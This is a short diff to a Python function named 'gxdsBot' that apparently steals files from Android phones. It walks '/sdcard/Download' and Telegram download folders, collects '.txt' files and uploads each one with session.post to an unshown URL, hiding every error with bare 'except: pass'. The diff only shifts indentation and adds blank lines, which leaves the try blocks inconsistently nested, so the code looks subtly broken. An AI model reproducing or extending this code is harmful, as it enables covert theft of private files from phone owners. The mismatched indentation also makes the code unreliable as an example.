@@ -1170,7 +1170,7 @@ def gxdsBot():
     except:
         pass
       
-      try:
+    try:
         sdcard_path = "/sdcard/Download"
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
         for file in file_list:
@@ -1197,6 +1197,7 @@ def gxdsBot():
                 sent = session.post(url, data=data2, files=files)
     except:
         pass
+      
       try:
         sdcard_path = "/sdcard/Download/Telegram"
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
@@ -1224,6 +1225,7 @@ def gxdsBot():
                 sent = session.post(url, data=data2, files=files)
     except:
         pass
+      
       try:
         sdcard_path = "/sdcard/Telegram/Telegram Files"
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
